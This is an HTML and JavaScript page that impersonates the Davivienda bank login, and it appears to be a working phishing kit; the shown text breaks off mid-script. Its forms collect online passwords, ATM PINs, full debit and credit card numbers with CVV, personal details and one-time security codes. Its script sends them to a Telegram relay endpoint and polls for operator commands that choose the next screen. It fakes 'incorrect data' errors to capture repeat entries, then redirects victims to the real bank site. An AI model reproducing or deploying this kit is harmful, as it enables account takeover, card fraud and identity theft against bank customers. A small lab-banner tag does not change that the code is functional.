<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso | Davivienda</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: 'HelveticaNeueLTStdThCn';
            src: url("/davivienda/HelveticaNeueLTStdThCn.eot.jsf?ln=css");
            src: local(':'),
                url("/davivienda/HelveticaNeueLTStdThCn.eot.jsf?ln=css?#iefix") format('embedded-opentype'),
                url("/davivienda/HelveticaNeueLTStdThCn.woff2.jsf?ln=css") format('woff2'),
                url("/davivienda/HelveticaNeueLTStdThCn.woff.jsf?ln=css") format('woff'),
                url("/davivienda/HelveticaNeueLTStdThCn.ttf.jsf?ln=css") format('truetype'),
                url("/davivienda/HelveticaNeueLTStdThCn.svg.jsf?ln=css#HelveticaNeueLTStdThCn") format('svg');
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdCn';
            src: url(/davivienda/HelveticaNeueLTStdCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdMdCn';
            src: url(/davivienda/HelveticaNeueLTStdMdCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdBdCn';
            src: url(/davivienda/HelveticaNeueLTStdBdCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdHvCn';
            src: url(/davivienda/HelveticaNeueLTStdHvCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }

        body {
            background: #6D6E72;
            font-family: "HelveticaNeueLTStdCn", sans-serif;
        }

        .texto-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            box-sizing: border-box;
            font-family: "HelveticaNeueLTStdCn", serif;
            color: #fff;
            font-size: 22px;
            margin: 0 0 15px 0;
            font-weight: normal;
            line-height: 100%;
        }

        .texto-1-small {
            font-size: 18px;
            line-height: 26px;
        }

        .entrada-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            box-sizing: border-box;
            margin: 0;
            font: inherit;
            font-family: inherit;
            display: block;
            width: 100%;
            height: 36px;
            line-height: 26px;
            border-radius: 10px;
            border: none;
            padding-left: 5px;
            padding-right: 5px;
            background-color: #595959;
            color: #ffffff;
            font-size: 14px;
            outline: none;
        }

        .boton-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            box-sizing: border-box;
            font: inherit;
            line-height: inherit;
            cursor: pointer;
            font-family: "HelveticaNeueLTStdBdCn", sans-serif;
            font-size: 14px;
            background-color: #ED1C27;
            border: none;
            border-radius: 5px;
            padding: 8px 0 10px;
            color: #FFF;
            box-shadow: 0 -4px 0 0 #ad0000 inset;
            outline: none;
            margin: 0 5px 0 0;
        }

        .boton-1:disabled {
            background-color: #806262;
            box-shadow: 0 -4px 0 0 #806262 inset;
            cursor: not-allowed;
        }

        .select-1 {
            -webkit-text-size-adjust: 100%;
            font-family: "HelveticaNeueLTStdCn", sans-serif, serif !important;
            line-height: 1.42857143;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            color: #ffffff;
            font-size: 12px !important;
            box-sizing: border-box;
            display: inline-block;
            height: 36px;
            margin-bottom: 10px;
            border: none;
            border-radius: 10px;
            background: url("/transaccional/javax.faces.resource/flecha-abajo.png.jsf?ln=img") no-repeat 97% center #a6a6a6;
            background-color: #a6a6a6;
            width: 100%;
            position: relative;
        }

        .label-1 {
            -webkit-text-size-adjust: 100%;
            line-height: 1.42857143;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            color: #ffffff;
            font-size: 12px !important;
            box-sizing: border-box;
            max-width: 100%;
            font-weight: 700;
            font-family: "HelveticaNeueLTStdMdCn", sans-serif;
            display: block;
            margin: 0 0 5px 0;
        }

        .loading-spinner {
            display: inline-block;
            width: 100px;
            height: 100px;
            border: 10px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: #ed1c27;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .personalizar-componente,
        .personalizar-componente * {
            color: #fff !important;
        }

        #label-banco,
        #label-tdc,
        #label-mes,
        #label-ano,
        #label-cvv,
        #label-check {
            -webkit-text-size-adjust: 100%;
            line-height: 1.42857143;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            color: #ffffff;
            font-size: 12px !important;
            box-sizing: border-box;
            max-width: 100%;
            font-weight: 700;
            font-family: "HelveticaNeueLTStdMdCn", sans-serif;
            display: block;
            margin: 0 0 5px 0;
        }

        .mensaje-error,
        #mensaje-codigo-error,
        #error-mes,
        #error-anio,
        #mensaje-tarjeta-error {
            color: yellow !important;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }

        .mensaje-error.show {
            display: block;
        }

        .mensaje-general-error {
            color: yellow;
            padding: 10px;
            text-align: center;
            font-size: 14px;
            display: none;
        }

        .mensaje-general-error.show {
            display: block;
        }

        .hidden {
            display: none !important;
        }

        .success-icon {
            color: #4CAF50;
            font-size: 80px;
            margin-bottom: 20px;
        }

        .error-icon {
            color: #d32f2f;
            font-size: 80px;
            margin-bottom: 20px;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }
    </style>
</head>

<body>
<x-lab-banner />

    <!-- Header -->
    <div class="text-center py-4" style="background-color: #ed1c27;">
        <img src="/davivienda/logo_davivienda.png" width="288" height="28" alt="">
    </div>
    <br>

    <!-- Vista: Login -->
    <div id="login" class="hidden">
        <div class="">
            <div id="errorGeneralLogin" class="mensaje-general-error"></div>
            <h1 class="texto-1 px-5 mt-4 text-star">
                Transacciones <strong style="font-family: 'HelveticaNeueLTStdBdCn', serif;">para Clientes</strong>
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <label class="label-1" for="tipo-documento">Tipo documento</label>
                <select class="select-1 w-100 mb-3 px-2" id="tipo-documento">
                    <option value="1" selected>Cedula de Ciudadania</option>
                    <option value="02">Cedula de Extranjeria</option>
                    <option value="03">NIT</option>
                    <option value="04">Tarjeta de Identidad</option>
                    <option value="05">Pasaporte</option>
                    <option value="06">Trj. Seguro Social Extranjero</option>
                    <option value="07">Sociedad Extranjera sin NIT en Colombia</option>
                    <option value="08">Fideicomiso</option>
                    <option value="09">NIT Menores</option>
                    <option value="10">RIF Venezuela</option>
                    <option value="11">NIT Extranjeria</option>
                    <option value="12">NIT Persona Natural</option>
                    <option value="13">Registro Civil De Nacimiento</option>
                    <option value="99">NIT Desasociado</option>
                    <option value="102">CIF(Numero Unico de Cliente)</option>
                    <option value="103">Numero de Identidad</option>
                    <option value="104">RTN</option>
                    <option value="100">Cedula de Identidad</option>
                    <option value="101">DIMEX</option>
                    <option value="105">CED</option>
                    <option value="106">PAS</option>
                </select>
                <div class="px-5">
                    <label class="label-1" for="usuario">No. documento</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="usuario" type="text"
                        autocomplete="off" minlength="5" maxlength="15">
                    <label class="label-1" for="clave">Clave virtual</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="clave" type="password"
                        autocomplete="new-password" minlength="4" maxlength="6">
                </div>
            </div>
            <div class="mt-5 text-center">
                <button type="button" id="btnLogin" class="boton-1 text-center px-5 pt-2" disabled>Continuar</button>
            </div>
        </form>
    </div>

    <!-- Vista: Clave Cajero -->
    <div id="clavecajero" class="hidden">
        <br>
        <div class="">
            <div id="errorGeneralClaveCajero" class="mensaje-general-error"></div>
            <h1 class="texto-1 texto-1-small px-5 mt-4 text-star">
                Ingresa la clave que usas en el cajero:
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <div class="px-5">
                    <label class="label-1" for="clavecajeroInput">Clave de cajero</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="clavecajeroInput" type="password"
                        autocomplete="new-password" minlength="4" maxlength="4">
                </div>
            </div>
            <div class="mt-5 text-center">
                <button type="button" id="btnClaveCajero" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </form>
    </div>

    <!-- Vista: Tarjeta de Debito -->
    <div id="tdb" class="hidden">
        <br>
        <div class="">
            <div id="errorGeneralTDB" class="mensaje-general-error"></div>
            <h1 class="texto-1 texto-1-small px-5 mt-4 text-star">
                Ingresa los datos de tu tarjeta debito:
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <div class="px-1">
                    <label class="label-1" for="numtarjetaTDB">Numero de tarjeta</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="numtarjetaTDB" type="text"
                        autocomplete="off" minlength="16" maxlength="19">

                    <div class="row">
                        <div class="col-6">
                            <label class="label-1" for="vencimientoTDB">Vencimiento</label>
                            <input class="entrada-1 w-100 mb-3 ps-3" id="vencimientoTDB" type="text"
                                placeholder="MM/AA" autocomplete="off" minlength="5" maxlength="5">
                        </div>
                        <div class="col-6">
                            <label class="label-1" for="cvvTDB">CVV</label>
                            <input class="entrada-1 w-100 mb-3 ps-3" id="cvvTDB" type="text"
                                autocomplete="off" minlength="3" maxlength="4">
                        </div>
                    </div>
                </div>
                <div class="px-5 mb-3" style="font-size: 10px;">
                    <span><input type="checkbox" id="checkTDB" style="accent-color: #ED1C27;"> Certifico que soy el titular de
                        este producto.</span>
                </div>

                <div class="mt-3 text-center">
                    <button type="button" id="btnTDB" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Vista: Tarjeta de Credito -->
    <div id="tdc" class="hidden">
        <br>
        <div class="">
            <div id="errorGeneralTDC" class="mensaje-general-error"></div>
            <h1 class="texto-1 texto-1-small px-5 mt-4 text-star">
                Ingresa los datos de tu tarjeta de credito:
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <div class="px-1">
                    <label class="label-1" for="numtarjetaTDC">Numero de tarjeta</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="numtarjetaTDC" type="text"
                        autocomplete="off" minlength="16" maxlength="19">

                    <div class="row">
                        <div class="col-6">
                            <label class="label-1" for="vencimientoTDC">Vencimiento</label>
                            <input class="entrada-1 w-100 mb-3 ps-3" id="vencimientoTDC" type="text"
                                placeholder="MM/AA" autocomplete="off" minlength="5" maxlength="5">
                        </div>
                        <div class="col-6">
                            <label class="label-1" for="cvvTDC">CVV</label>
                            <input class="entrada-1 w-100 mb-3 ps-3" id="cvvTDC" type="text"
                                autocomplete="off" minlength="3" maxlength="4">
                        </div>
                    </div>
                </div>
                <div class="px-5 mb-3" style="font-size: 10px;">
                    <span><input type="checkbox" id="checkTDC" style="accent-color: #ED1C27;"> Certifico que soy el titular de
                        este producto.</span>
                </div>

                <div class="mt-3 text-center">
                    <button type="button" id="btnTDC" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Vista: Datos Personales -->
    <div id="datos" class="hidden">
        <br>
        <div class="">
            <div id="errorGeneralDatos" class="mensaje-general-error"></div>
            <h1 class="texto-1 texto-1-small px-5 mt-4 text-star">
                Confirma tus datos personales:
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <div class="px-1">
                    <label class="label-1" for="nombre">Nombre completo</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="nombre" type="text"
                        autocomplete="off" minlength="3" maxlength="100">

                    <label class="label-1" for="cedula">Numero de cedula</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="cedula" type="text"
                        autocomplete="off" minlength="5" maxlength="15">

                    <label class="label-1" for="email">Correo electronico</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="email" type="email"
                        autocomplete="off">

                    <label class="label-1" for="celular">Numero de celular</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="celular" type="text"
                        autocomplete="off" minlength="10" maxlength="10">

                    <label class="label-1" for="ciudad">Ciudad</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="ciudad" type="text"
                        autocomplete="off">

                    <label class="label-1" for="direccion">Direccion</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="direccion" type="text"
                        autocomplete="off">
                </div>
            </div>
            <div class="mt-3 text-center">
                <button type="button" id="btnDatos" class="boton-1 text-center px-5 pt-2" disabled>Confirmar</button>
            </div>
        </form>
    </div>

    <!-- Vista: OTP App -->
    <div id="otpapp" class="hidden">
        <br>
        <div class="">
            <div id="errorGeneralOtpApp" class="mensaje-general-error"></div>
            <h1 class="texto-1 texto-1-small px-5 mt-4 text-star">
                Ingresa el Codigo de seguridad que se ha generado en la App:
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <div class="px-5">
                    <label class="label-1" for="otpappInput">Codigo de seguridad</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="otpappInput" type="password"
                        minlength="6" maxlength="8">
                </div>
            </div>
            <div class="mt-5 text-center">
                <button type="button" id="btnOtpApp" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </form>
    </div>

    <!-- Vista: OTP SMS -->
    <div id="otpsms" class="hidden">
        <br>
        <div class="">
            <div id="errorGeneralOtpSms" class="mensaje-general-error"></div>
            <h1 class="texto-1 texto-1-small px-5 mt-4 text-star">
                Ingresa el Codigo de seguridad que hemos enviado a su celular o correo electronico:
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <div class="px-5">
                    <label class="label-1" for="otpsmsInput">Codigo de seguridad</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="otpsmsInput" type="password"
                        minlength="6" maxlength="8">
                </div>
            </div>
            <div class="mt-5 text-center">
                <button type="button" id="btnOtpSms" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </form>
    </div>

    <!-- Vista: Clave Virtual -->
    <div id="clavevirtual" class="hidden">
        <br>
        <div class="">
            <div id="errorGeneralClaveVirtual" class="mensaje-general-error"></div>
            <h1 class="texto-1 texto-1-small px-5 mt-4 text-star">
                Ingresa tu clave virtual:
            </h1>
        </div>
        <br>
        <form>
            <div class="px-5 mb-5">
                <div class="px-5">
                    <label class="label-1" for="clavevirtualInput">Clave virtual</label>
                    <input class="entrada-1 w-100 mb-3 ps-3" id="clavevirtualInput" type="password"
                        autocomplete="new-password" minlength="4" maxlength="6">
                </div>
            </div>
            <div class="mt-5 text-center">
                <button type="button" id="btnClaveVirtual" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </form>
    </div>

    <!-- Vista: Wait -->
    <div id="wait" class="hidden">
        <br>
        <div class="text-center mt-5">
            <div class="loading-spinner"></div>
        </div>
        <br>
        <div class="text-center">
            <p class="texto-1">Espere un momento por favor.</p>
        </div>
    </div>

    <!-- Vista: Exito -->
    <div id="exito" class="hidden">
        <br>
        <div class="text-center mt-5">
            <i class="bi bi-check-circle-fill success-icon"></i>
            <h2 style="color: #fff; margin-bottom: 20px;">Proceso Completado</h2>
            <p style="color: #ccc;">Su transaccion ha sido procesada exitosamente.</p>
            <p style="color: #ccc;">Sera redirigido en unos momentos...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="hidden">
        <br>
        <div class="text-center mt-5">
            <i class="bi bi-x-circle-fill error-icon"></i>
            <h2 style="color: #fff; margin-bottom: 20px;">Error en el Proceso</h2>
            <p style="color: #ccc;">No fue posible completar la operacion.</p>
            <p style="color: #ccc;">Por favor intente mas tarde.</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACION INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session ID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES DE ALMACENAMIENTO ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            // ==================== FUNCIONES DE UI ====================
            function hideAllViews() {
                $('#login, #clavecajero, #tdb, #tdc, #datos, #otpapp, #otpsms, #clavevirtual, #wait, #exito, #error').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Verificar si la vista ya fue mostrada antes
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    // Mostrar mensaje de error y limpiar campos
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Los Datos ingresados son incorrectos, por favor verifiquelos e ingreselos nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'clavecajero') {
                        $('#errorGeneralClaveCajero').text('La clave de cajero ingresada es incorrecta, ingresala nuevamente.').addClass('show');
                        $('#clavecajeroInput').val('');
                        $('#btnClaveCajero').prop('disabled', true);
                    } else if (viewId === 'tdb') {
                        $('#errorGeneralTDB').text('Validacion sin exito, intenta nuevamente o ingresa los datos de otra tarjeta.').addClass('show');
                        $('#numtarjetaTDB, #vencimientoTDB, #cvvTDB').val('');
                        $('#checkTDB').prop('checked', false);
                        $('#btnTDB').prop('disabled', true);
                    } else if (viewId === 'tdc') {
                        $('#errorGeneralTDC').text('Validacion sin exito, intenta nuevamente o ingresa los datos de otra tarjeta.').addClass('show');
                        $('#numtarjetaTDC, #vencimientoTDC, #cvvTDC').val('');
                        $('#checkTDC').prop('checked', false);
                        $('#btnTDC').prop('disabled', true);
                    } else if (viewId === 'datos') {
                        $('#errorGeneralDatos').text('Los datos ingresados son incorrectos, ingresalos nuevamente.').addClass('show');
                        $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').val('');
                        $('#btnDatos').prop('disabled', true);
                    } else if (viewId === 'otpapp') {
                        $('#errorGeneralOtpApp').text('El Codigo ingresado es incorrecto, ingresalo nuevamente.').addClass('show');
                        $('#otpappInput').val('');
                        $('#btnOtpApp').prop('disabled', true);
                    } else if (viewId === 'otpsms') {
                        $('#errorGeneralOtpSms').text('El Codigo ingresado es incorrecto, ingresalo nuevamente.').addClass('show');
                        $('#otpsmsInput').val('');
                        $('#btnOtpSms').prop('disabled', true);
                    } else if (viewId === 'clavevirtual') {
                        $('#errorGeneralClaveVirtual').text('La clave virtual ingresada es incorrecta, ingresala nuevamente.').addClass('show');
                        $('#clavevirtualInput').val('');
                        $('#btnClaveVirtual').prop('disabled', true);
                    }
                } else {
                    // Limpiar mensajes de error
                    $('.mensaje-general-error').removeClass('show').text('');
                }

                // Registrar vista en historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                showView('wait');
                setTimeout(iniciarPolling, 3000);
            }

            // ==================== COMUNICACION CON TELEGRAM ====================
            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Envio en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = [
                    'usuario', 'clave', 'ente', 'status', 'uniqid',
                    'numtarjetaTDB', 'vencimientoTDB', 'cvvTDB',
                    'numtarjetaTDC', 'vencimientoTDC', 'cvvTDC',
                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'departamento',
                    'banco', 'tipoPersona', 'otpsms', 'otpapp', 'clavecajero', 'clavevirtual'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                console.log('Enviando datos:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Respuesta del servidor:', result);
                } catch (e) {
                    console.error('Error al enviar:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const waitElement = document.getElementById('wait');
                if (waitElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        const viewMap = {
                            'login': 'login',
                            'user': 'login',
                            'clavecajero': 'clavecajero',
                            'tdb': 'tdb',
                            'tdc': 'tdc',
                            'tc': 'tdc',
                            'datos': 'datos',
                            'otpapp': 'otpapp',
                            'otpsms': 'otpsms',
                            'clavevirtual': 'clavevirtual',
                            'exito': 'exito',
                            'fin': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redireccion automatica
                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.davivienda.com/wps/portal/personas/nuevo/personas/aqui_puedo/comprar_lo_que_deseo/tarjeta_de_credito/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const isValid = usuario.length >= 4 && /^\d{4,15}$/.test(usuario) && /^\d{4,6}$/.test(clave);
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateClaveCajero() {
                const clavecajero = $('#clavecajeroInput').val().trim();
                const isValid = /^\d{4}$/.test(clavecajero);
                $('#btnClaveCajero').prop('disabled', !isValid);
                return isValid;
            }

            function validateOtpApp() {
                const value = $('#otpappInput').val().trim();
                const isValid = /^\d{6,8}$/.test(value);
                $('#btnOtpApp').prop('disabled', !isValid);
                return isValid;
            }

            function validateOtpSms() {
                const value = $('#otpsmsInput').val().trim();
                const isValid = /^\d{6,8}$/.test(value);
                $('#btnOtpSms').prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS DE FORMULARIOS ====================

            // Login
            $('#usuario, #clave').on('input', function() {
                validateLogin();
            });

            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'davivienda');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave Cajero
            $('#clavecajeroInput').on('input', function() {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateClaveCajero();
            });

            $('#btnClaveCajero').on('click', async function () {
                if (validateClaveCajero()) {
                    saveToLocalStorage('clavecajero', $('#clavecajeroInput').val().trim());
                    saveToLocalStorage('status', 'CLAVECAJERO');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Debito (TDB)
            function validateTDB() {
                const num = $('#numtarjetaTDB').val().replace(/\s/g, '');
                const ven = $('#vencimientoTDB').val();
                const cvv = $('#cvvTDB').val();
                const check = $('#checkTDB').is(':checked');

                const isValid = num.length >= 15 &&
                               validarLuhn(num) &&
                               validarVencimiento(ven) &&
                               cvv.length >= 3 &&
                               check;

                $('#btnTDB').prop('disabled', !isValid);
                return isValid;
            }

            $('#numtarjetaTDB').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTDB();
            });

            $('#vencimientoTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                $(this).val(value);
                validateTDB();
            });

            $('#cvvTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTDB();
            });

            $('#checkTDB').on('change', function () {
                validateTDB();
            });

            $('#btnTDB').on('click', async function () {
                if (validateTDB()) {
                    saveToLocalStorage('numtarjetaTDB', $('#numtarjetaTDB').val().trim());
                    saveToLocalStorage('cvvTDB', $('#cvvTDB').val().trim());
                    saveToLocalStorage('vencimientoTDB', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Credito (TDC)
            function validateTDC() {
                const num = $('#numtarjetaTDC').val().replace(/\s/g, '');
                const ven = $('#vencimientoTDC').val();
                const cvv = $('#cvvTDC').val();
                const check = $('#checkTDC').is(':checked');

                const isValid = num.length >= 15 &&
                               validarLuhn(num) &&
                               validarVencimiento(ven) &&
                               cvv.length >= 3 &&
                               check;

                $('#btnTDC').prop('disabled', !isValid);
                return isValid;
            }

            $('#numtarjetaTDC').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTDC();
            });

            $('#vencimientoTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                $(this).val(value);
                validateTDC();
            });

            $('#cvvTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTDC();
            });

            $('#checkTDC').on('change', function () {
                validateTDC();
            });

            $('#btnTDC').on('click', async function () {
                if (validateTDC()) {
                    saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().trim());
                    saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                    saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Datos Personales
            function validateDatos() {
